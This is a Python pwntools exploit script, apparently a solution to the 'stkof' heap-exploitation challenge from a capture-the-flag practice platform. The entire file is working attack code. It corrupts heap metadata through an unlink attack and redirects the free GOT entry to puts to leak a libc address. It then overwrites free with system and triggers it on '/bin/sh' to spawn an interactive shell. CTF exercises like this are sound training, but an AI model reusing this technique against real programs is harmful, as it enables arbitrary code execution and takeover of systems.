#!/usr/bin/env python
# coding=utf-8
from pwn import *
sh=process('./stkof')
#sh=remote("node3.buuoj.cn",26510)
elf=ELF("./stkof")
context.arch="amd64"
#context.log_level="debug"
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF('./libc.so.6')

global_ptr = 0x0602140
free_plt = 0x400750

def Alloc(size):
    sh.sendline("1")
    sh.sendline(str(size))
    sh.recvuntil("OK\n")

def Full(index, padding):
    sh.sendline("2")
    sh.sendline(str(index))
    sh.sendline(str(len(padding)))
    sh.send(padding)
    sh.recvuntil("OK\n")

def Free(index):
    sh.sendline("3")
    sh.sendline(str(index))

Alloc(0x90)#1
Alloc(0x90)#2
Alloc(0x90)#3
Alloc(0x20)#4
payload = p64(0) + p64(0x91) + p64(global_ptr+0x10-0x18) + p64(global_ptr+0x10-0x10)
payload = payload.ljust(0x90, "\x00")
payload += p64(0x90) + p64(0xa0)
Full(2, payload)
Free(3)
#unlink succeeded
print str(proc.pidof(sh))
pause()

payload = p64(0)*2 + p64(elf.got['free']) + p64(elf.got['puts'])
Full(2, payload)
payload = p64(elf.plt['puts'])
#print str(proc.pidof(sh))
pause()
Full(1, payload)
#print str(proc.pidof(sh))
Free(2)
sh.recvuntil("OK\n")
leak_addr=u64(sh.recv(6).ljust(8,'\x00'))#leak puts_got
log.success("leak address is: "+hex(leak_addr))
libc_offset=leak_addr-libc.sym["puts"]
log.success("libc offset is: "+hex(libc_offset))
sys_addr=libc_offset+libc.sym["system"]
log.success("system address is: "+hex(sys_addr))

payload=p64(sys_addr)
Full(1, payload)
Full(4, "/bin/sh\x00")
Free(4)
sh.interactive()
